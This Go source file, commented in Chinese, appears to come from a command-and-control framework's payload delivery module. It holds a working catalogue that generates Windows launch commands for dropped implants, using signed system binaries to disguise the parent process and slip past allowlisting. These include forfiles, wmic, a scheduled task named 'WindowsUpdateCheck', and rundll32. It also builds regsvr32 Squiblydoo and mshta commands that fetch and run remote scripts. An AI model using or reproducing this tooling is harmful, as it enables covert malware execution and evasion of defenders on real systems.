package delivery

import (
	"fmt"
	"path"
	"sort"
	"strings"
)

// ===== 启动方式目录（阶段三 §3.10 供应链）=====
//
// 解决的问题：载荷**落地之后怎么起**。此前只有"下载并直接执行"
// （commands.go 的 IWR/certutil/bitsadmin/curl），而直接起 payload.exe 意味着：
//   - 子进程的父进程就是调用它的 shell，进程树一眼可疑；
//   - 控制台子系统会闪窗（Windows EXE 虽用 -H windowsgui，但 stager/工具链未必）；
//   - 某些环境有 AppLocker/WDAC 只放行特定 LOLBin 的签名。
//
// 这里把"用哪个系统自带二进制来当启动器"做成一个**可校验的目录**：
// 每个方式声明自己支持哪种载荷形态、需要什么前提、换来什么、有什么坑。
// 调用方（API/前端）据此只展示**当前载荷形态真能用**的那些，
// 而不是给一串复制过去必然失败的命令。
//
// 为什么要有"不支持"的显式记录：installutil/msbuild 这类方式在公开资料里很常见，
// 但它们只对 .NET 程序集有意义，我们的载荷是原生 PE —— 不写清楚，
// 运维会照着博客试一遍再回来问为什么不行。

// LaunchFormat 载荷形态
type LaunchFormat string

const (
	// FormatExe 原生 PE 可执行文件（完整客户端 / stager）
	FormatExe LaunchFormat = "exe"
	// FormatDLL 原生 PE 动态库（build_templates 的 *dll 模板）
	FormatDLL LaunchFormat = "dll"
	// FormatShellcode 无阶段 shellcode（需注入器，不是"启动"而是"注入"）
	FormatShellcode LaunchFormat = "shellcode"
)

// LaunchInput 构造命令所需的输入
type LaunchInput struct {
	// LocalPath 目标机上的载荷路径（如 C:\Windows\Temp\update.exe）
	LocalPath string
	// DLLExport DLL 的导出名（rundll32 用；留空取默认 Run）
	DLLExport string
	// Pass 客户端上线口令（作为参数传给载荷）
	Pass string
	// HostedURL 需要"远程托管物"的方式（SCT/HTA）的地址
	HostedURL string
	// TaskName schtasks 方式的任务名
	TaskName string
}

// LaunchMethod 一种启动方式
type LaunchMethod struct {
	ID          string         `json:"id"`
	Name        string         `json:"name"`
	NameEn      string         `json:"name_en"`
	Description string         `json:"description"`
	Formats     []LaunchFormat `json:"formats"`
	// NeedsHostedURL 该方式执行的是**远程托管物**（SCT/HTA），不是本地载荷文件
	NeedsHostedURL bool `json:"needs_hosted_url"`
	// Buys 这个方式换来了什么（父进程伪装 / 绕过 / 无窗口…）
	Buys []string `json:"buys"`
	// Caveats 前提与坑（必读）
	Caveats []string `json:"caveats"`

	build func(LaunchInput) (string, error)
}

// quoteWinArg 给 Windows 命令行参数加引号。
//
// 必须处理的反斜杠规则（CommandLineToArgvW 的解析方式）：
// 引号前的连续反斜杠要翻倍，否则 `C:\dir\` 这种**以反斜杠结尾的路径**
// 会把闭合引号转义掉，整条命令的引号配对就乱了。
func quoteWinArg(s string) string {
	if s == "" {
		return `""`
	}
	// 无需引号的情形：没有空格/制表符/引号，且非空
	if !strings.ContainsAny(s, " \t\"") {
		return s
	}
	var b strings.Builder
	b.WriteByte('"')
	backslashes := 0
	for _, r := range s {
		switch r {
		case '\\':
			backslashes++
		case '"':
			// 引号前的反斜杠翻倍，再转义引号本身
			b.WriteString(strings.Repeat(`\`, backslashes*2+1))
			b.WriteRune(r)
			backslashes = 0
		default:
			b.WriteString(strings.Repeat(`\`, backslashes))
			b.WriteRune(r)
			backslashes = 0
		}
	}
	// 结尾的反斜杠要翻倍，否则会把我们加上的闭合引号转义掉
	b.WriteString(strings.Repeat(`\`, backslashes*2))
	b.WriteByte('"')
	return b.String()
}

// dirOf / baseOf 用 path 包做跨平台切分后再统一成反斜杠（Windows 路径）
func dirOf(p string) string {
	p = strings.ReplaceAll(p, "\\", "/")
	d := path.Dir(p)
	if d == "." || d == "/" {
		return ""
	}
	return strings.ReplaceAll(d, "/", "\\")
}

func baseOf(p string) string {
	p = strings.ReplaceAll(p, "\\", "/")
	return path.Base(p)
}

// passArg 口令参数（空则不加）
func passArg(pass string) string {
	if strings.TrimSpace(pass) == "" {
		return ""
	}
	return " " + quoteWinArg(pass)
}

// forfilesCArg forfiles 的 /c 参数是**再一层命令行**，内层引号要写成 \" 。
//
// 这是最容易写错的一处：直接写成 /c "payload.exe" 时 forfiles 会把参数
// 交给 cmd 解析，路径带空格就散架；官方写法是 /c "cmd /c \"...\""。
func forfilesCArg(inner string) string {
	return `cmd /c \"` + strings.ReplaceAll(inner, `"`, `\"`) + `\"`
}

var launchMethods = []LaunchMethod{
	{
		ID:          "direct",
		Name:        "直接执行",
		NameEn:      "Direct",
		Description: "直接运行载荷。基线方式，进程树里父进程就是当前 shell。",
		Formats:     []LaunchFormat{FormatExe},
		Buys:        []string{"最简单，不依赖任何额外组件"},
		Caveats: []string{
			"父进程即调用方（cmd/powershell/explorer），进程树显眼",
			"控制台子系统载荷可能闪窗（模板已用 -H windowsgui，自备载荷需自行处理）",
		},
		build: func(in LaunchInput) (string, error) {
			if err := requirePath(in.LocalPath); err != nil {
				return "", err
			}
			return quoteWinArg(in.LocalPath) + passArg(in.Pass), nil
		},
	},
	{
		ID:          "conhost_headless",
		Name:        "conhost 无窗口启动",
		NameEn:      "conhost --headless",
		Description: "用 conhost.exe 的 --headless 参数启动，不分配可见控制台窗口。",
		Formats:     []LaunchFormat{FormatExe},
		Buys: []string{
			"控制台子系统载荷也不闪窗（比 -H windowsgui 更通用）",
			"父进程是 conhost.exe（微软签名组件）",
		},
		Caveats: []string{
			"conhost --headless 需要 Windows 11 / Server 2022 及以上；旧系统无此参数",
			"窗口虽不可见但仍存在，仅凭这一点不足以规避内存扫描",
		},
		build: func(in LaunchInput) (string, error) {
			if err := requirePath(in.LocalPath); err != nil {
				return "", err
			}
			return "conhost.exe --headless " + quoteWinArg(in.LocalPath) + passArg(in.Pass), nil
		},
	},
	{
		ID:          "forfiles",
		Name:        "forfiles 父进程伪装",
		NameEn:      "forfiles parent spoof",
		Description: "借 forfiles.exe 拉起载荷，子进程父进程是微软签名的 forfiles.exe。",
		Formats:     []LaunchFormat{FormatExe},
		Buys: []string{
			"父进程是签名的微软二进制（打断 shell→payload 的直连进程树）",
			"forfiles 在所有 Windows 版本自带",
		},
		Caveats: []string{
			"/c 参数是再一层命令行，内层引号必须写成 \\\" （本目录已处理）",
			"forfiles 会等子进程结束才返回；用于持久化时注意别被当成前台进程",
		},
		build: func(in LaunchInput) (string, error) {
			if err := requirePath(in.LocalPath); err != nil {
				return "", err
			}
			dir := dirOf(in.LocalPath)
			name := baseOf(in.LocalPath)
			if dir == "" {
				return "", fmt.Errorf("forfiles 需要绝对路径（含目录），当前: %q", in.LocalPath)
			}
			inner := name + passArg(in.Pass)
			return fmt.Sprintf(`forfiles /p %s /m %s /c "%s"`,
				quoteWinArg(dir), quoteWinArg(name), forfilesCArg(inner)), nil
		},
	},
	{
		ID:          "pcalua",
		Name:        "pcalua 兼容层启动",
		NameEn:      "pcalua shim",
		Description: "用程序兼容性助手 pcalua.exe 启动，父进程为 pcalua.exe。",
		Formats:     []LaunchFormat{FormatExe},
		Buys:        []string{"父进程是系统组件，且会经过兼容性层（部分环境可绕白名单）"},
		Caveats: []string{
			"-a 指定目标、-d 指定工作目录；工作目录不给会以 pcalua 自身目录启动",
			"旧系统（Win7 之前）无 pcalua",
		},
		build: func(in LaunchInput) (string, error) {
			if err := requirePath(in.LocalPath); err != nil {
				return "", err
			}
			cmd := "pcalua.exe -a " + quoteWinArg(in.LocalPath)
			if dir := dirOf(in.LocalPath); dir != "" {
				cmd += " -d " + quoteWinArg(dir)
			}
			return cmd + passArg(in.Pass), nil
		},
	},
	{
		ID:          "wmic_process_call",
		Name:        "wmic 创建进程",
		NameEn:      "wmic process call create",
		Description: "经 WMI 创建进程，父进程是 WmiPrvSE.exe。",
		Formats:     []LaunchFormat{FormatExe},
		Buys: []string{
			"父进程是 WmiPrvSE.exe（WMI 服务），与调用方完全脱钩",
			"可用于跨会话/远程（本目录只生成本机形式）",
		},
		Caveats: []string{
			"wmic 在新版 Windows 已被标记弃用（部分镜像需按需安装）",
			"WMI 活动会被 WMI 审计/EDR 重点记录",
		},
		build: func(in LaunchInput) (string, error) {
			if err := requirePath(in.LocalPath); err != nil {
				return "", err
			}
			inner := in.LocalPath + passArg(in.Pass)
			return `wmic process call create "` + inner + `"`, nil
		},
	},
	{
		ID:          "explorer",
		Name:        "explorer 启动",
		NameEn:      "explorer launch",
		Description: "让 explorer.exe 代为启动，父进程为 explorer.exe。",
		Formats:     []LaunchFormat{FormatExe},
		Buys:        []string{"父进程是 explorer.exe，混在正常用户活动里"},
		Caveats: []string{
			"explorer 通常不把参数透传给目标程序 —— 需要传口令时用其他方式",
			"在无交互会话（服务/计划任务）里没有 explorer 可借",
		},
		build: func(in LaunchInput) (string, error) {
			if err := requirePath(in.LocalPath); err != nil {
				return "", err
			}
			if strings.TrimSpace(in.Pass) != "" {
				return "", fmt.Errorf("explorer 方式无法透传参数（口令），请改用 forfiles/pcalua/wmic")
			}
			return "explorer.exe " + quoteWinArg(in.LocalPath), nil
		},
	},
	{
		ID:          "schtasks",
		Name:        "计划任务启动",
		NameEn:      "schtasks",
		Description: "创建一次性计划任务并立即运行，父进程为任务计划服务。",
		Formats:     []LaunchFormat{FormatExe},
		Buys: []string{
			"父进程是 svchost.exe(TaskScheduler)，与调用方脱钩",
			"可指定以 SYSTEM/其他用户身份运行（需相应权限）",
		},
		Caveats: []string{
			"创建任务会留注册表/任务库痕迹，用完应删除（/delete）",
			"默认以当前用户运行；提权需 /ru SYSTEM 且调用方已有权限",
		},
		build: func(in LaunchInput) (string, error) {
			if err := requirePath(in.LocalPath); err != nil {
				return "", err
			}
			tn := strings.TrimSpace(in.TaskName)
			if tn == "" {
				tn = "WindowsUpdateCheck"
			}
			inner := quoteWinArg(in.LocalPath) + passArg(in.Pass)
			return fmt.Sprintf(`schtasks /create /f /tn %s /tr "%s" /sc once /st 00:00 & schtasks /run /tn %s`,
				quoteWinArg(tn), inner, quoteWinArg(tn)), nil
		},
	},
	{
		ID:          "rundll32",
		Name:        "rundll32 加载 DLL",
		NameEn:      "rundll32",
		Description: "rundll32 调用 DLL 的导出函数。需要 DLL 形态载荷。",
		Formats:     []LaunchFormat{FormatDLL},
		Buys:        []string{"不落地 exe（只有 dll），文件类型白名单常只拦 exe"},
		Caveats: []string{
			"导出名必须真实存在；默认 Run（模板导出名见 build_templates）",
			"参数传递受 rundll32 自身解析限制（不能有未转义逗号）",
		},
		build: func(in LaunchInput) (string, error) {
			if err := requirePath(in.LocalPath); err != nil {
				return "", err
			}
			exp := strings.TrimSpace(in.DLLExport)
			if exp == "" {
				exp = "Run"
			}
			if strings.ContainsAny(exp, ", \"") {
				return "", fmt.Errorf("DLL 导出名含非法字符: %q", exp)
			}
			// rundll32 的 "dll,export" 必须**不加引号**地连写，否则解析失败；
			// 路径含空格时用整段引号包住 dll,export（rundll32 支持这种写法）
			target := in.LocalPath + "," + exp
			if strings.ContainsAny(in.LocalPath, " \t") {
				target = `"` + target + `"`
			}
			return "rundll32.exe " + target + passArg(in.Pass), nil
		},
	},
	{
		ID:          "regsvr32_dll",
		Name:        "regsvr32 注册 DLL",
		NameEn:      "regsvr32 local dll",
		Description: "regsvr32 静默注册本地 DLL（会调用 DllRegisterServer 导出）。",
		Formats:     []LaunchFormat{FormatDLL},
		Buys:        []string{"regsvr32 是长期在 LOLBin 白名单里的签名二进制"},
		Caveats: []string{
			"要求 DLL **导出 DllRegisterServer**，否则 regsvr32 只会报错退出",
			"/s 静默：去掉会弹成功提示框，暴露操作",
		},
		build: func(in LaunchInput) (string, error) {
			if err := requirePath(in.LocalPath); err != nil {
				return "", err
			}
			return "regsvr32.exe /s " + quoteWinArg(in.LocalPath), nil
		},
	},
	{
		ID:             "regsvr32_squiblydoo",
		Name:           "regsvr32 远程脚本 (Squiblydoo)",
		NameEn:         "regsvr32 squiblydoo",
		Description:    "regsvr32 经 scrobj.dll 执行远程 SCT 脚本，不落地文件。",
		Formats:        []LaunchFormat{FormatExe},
		NeedsHostedURL: true,
		Buys: []string{
			"不落地文件（载荷内容只存在于内存）",
			"经典 AppLocker 绕过：regsvr32 被多数白名单放行",
		},
		Caveats: []string{
			"需要一个**你自己托管的 SCT**（HostedURL），不是本载荷路径",
			"该技术已被 EDR 重点覆盖，现代环境成功率低",
			"执行的是脚本而非本载荷，需要脚本里再去拉取/解密真正的载荷",
		},
		build: func(in LaunchInput) (string, error) {
			u := strings.TrimSpace(in.HostedURL)
			if u == "" {
				return "", fmt.Errorf("该方式需要 HostedURL（自托管的 SCT 地址）")
			}
			if strings.ContainsAny(u, `"`) {
				return "", fmt.Errorf("HostedURL 含非法字符: %q", u)
			}
			return fmt.Sprintf(`regsvr32.exe /s /n /u /i:%s scrobj.dll`, u), nil
		},
	},
	{
		ID:             "mshta_remote",
		Name:           "mshta 远程 HTA",
		NameEn:         "mshta remote hta",
		Description:    "mshta 执行远程 HTA，不落地文件。",
		Formats:        []LaunchFormat{FormatExe},
		NeedsHostedURL: true,
		Buys:           []string{"不落地文件；mshta 常被白名单放行"},
		Caveats: []string{
			"需要一个**你自己托管的 HTA**（HostedURL）",
			"mshta 在现代 EDR 下同样高度可疑；执行的是脚本不是本载荷",
		},
		build: func(in LaunchInput) (string, error) {
			u := strings.TrimSpace(in.HostedURL)
			if u == "" {
				return "", fmt.Errorf("该方式需要 HostedURL（自托管的 HTA 地址）")
			}
			if strings.ContainsAny(u, `"`) {
				return "", fmt.Errorf("HostedURL 含非法字符: %q", u)
			}
			return "mshta.exe " + u, nil
		},
	},
}

// 公开资料里常见、但**对本项目的原生 PE 载荷无效**的方式。
// 显式列出来是为了让运维不用照着博客白试一遍。
var unsupportedLaunchNotes = map[string]string{
	"installutil": "只对 .NET 程序集有效（需带 [System.ComponentModel.RunInstaller] 的安装器类）；" +
		"本项目载荷是原生 PE，installutil 会直接报错",
	"msbuild": "需要 .NET 内联任务（.proj/.targets）配合；原生 PE 无 .NET 运行时可用",
	"regasm":  "只对 .NET 程序集有效（注册 COM 可见类）；原生 PE 不适用",
	"regsvcs": "只对 .NET 程序集有效；原生 PE 不适用",
}

// LaunchMethods 返回目录中全部方式（按 ID 排序，输出稳定）
func LaunchMethods() []LaunchMethod {
	out := make([]LaunchMethod, len(launchMethods))
	copy(out, launchMethods)
	sort.Slice(out, func(i, j int) bool { return out[i].ID < out[j].ID })
	return out
}

// LaunchMethodsFor 返回**指定载荷形态真能用**的方式。
// 前端据此过滤：给一堆点了必然失败的命令比不给更糟。
func LaunchMethodsFor(format string) []LaunchMethod {
	f := LaunchFormat(strings.ToLower(strings.TrimSpace(format)))
	var out []LaunchMethod
	for _, m := range LaunchMethods() {
		for _, s := range m.Formats {
			if s == f {
				out = append(out, m)
				break
			}
		}
	}
	return out
}

// UnsupportedLaunchNotes 常见但不可用方式的说明（key 为方式名）
func UnsupportedLaunchNotes() map[string]string {
	out := make(map[string]string, len(unsupportedLaunchNotes))
	for k, v := range unsupportedLaunchNotes {
		out[k] = v
	}
	return out
}

// BuildLaunchCommand 生成指定方式的命令行。
//
// 形态不匹配时返回明确错误（而不是生成一条跑不通的命令）。
func BuildLaunchCommand(methodID string, format string, in LaunchInput) (string, error) {
	id := strings.ToLower(strings.TrimSpace(methodID))
	if id == "" {
		id = "direct"
	}
	f := LaunchFormat(strings.ToLower(strings.TrimSpace(format)))
	if f == "" {
		f = FormatExe
	}
	for _, m := range launchMethods {
		if m.ID != id {
			continue
		}
		supported := false
		for _, s := range m.Formats {
			if s == f {
				supported = true
				break
			}
		}
		if !supported {
			return "", fmt.Errorf("启动方式 %s 不支持 %s 形态载荷（支持: %s）",
				id, f, joinFormats(m.Formats))
		}
		return m.build(in)
	}
	if note, ok := unsupportedLaunchNotes[id]; ok {
		return "", fmt.Errorf("启动方式 %s 对本项目载荷不适用：%s", id, note)
	}
	return "", fmt.Errorf("未知启动方式: %s", methodID)
}

func joinFormats(fs []LaunchFormat) string {
	parts := make([]string, len(fs))
	for i, f := range fs {
		parts[i] = string(f)
	}
	return strings.Join(parts, "/")
}

func requirePath(p string) error {
	if strings.TrimSpace(p) == "" {
		return fmt.Errorf("缺少载荷路径")
	}
	return nil
}

// InferLaunchFormat 从载荷文件名推断形态。
//
// 为什么靠推断：`format`（exe/dll/bin/hex）只在生成载荷时是请求参数，
// **没有落到 WebDelivery 记录里**。能拿到的最可靠信号就是保存的文件名后缀。
// 推断不出来时返回 exe —— 这是绝大多数载荷的形态，也是"不额外承诺什么"的安全默认。
//
// 注意这不是权威值：若以后把 format 落库，应改成直接读那一列。
func InferLaunchFormat(saveFilename, fileName string) LaunchFormat {
	for _, name := range []string{saveFilename, fileName} {
		n := strings.ToLower(strings.TrimSpace(name))
		if n == "" {
			continue
		}
		switch {
		case strings.HasSuffix(n, ".dll"):
			return FormatDLL
		case strings.HasSuffix(n, ".bin"), strings.HasSuffix(n, ".hex"):
			return FormatShellcode
		case strings.HasSuffix(n, ".exe"):
			return FormatExe
		}
	}
	return FormatExe
}

// LaunchFormatNote 某载荷形态为什么没有（或需要特别注意）启动方式。
//
// shellcode 没有"启动方式"可言 —— 它不是可执行文件，必须先注入到某个宿主进程里。
// 返回空列表而不加解释，前端只会显示一个空区块，运维会以为是功能坏了。
func LaunchFormatNote(format string) string {
	switch LaunchFormat(strings.ToLower(strings.TrimSpace(format))) {
	case FormatShellcode:
		return "shellcode 不是可执行文件，没有\"启动方式\"：需要先用注入器（如模块注入/" +
			"进程镂空/APC）写入目标进程再执行。此处列出的是**落地型载荷**的启动方式。"
	default:
		return ""
	}
}
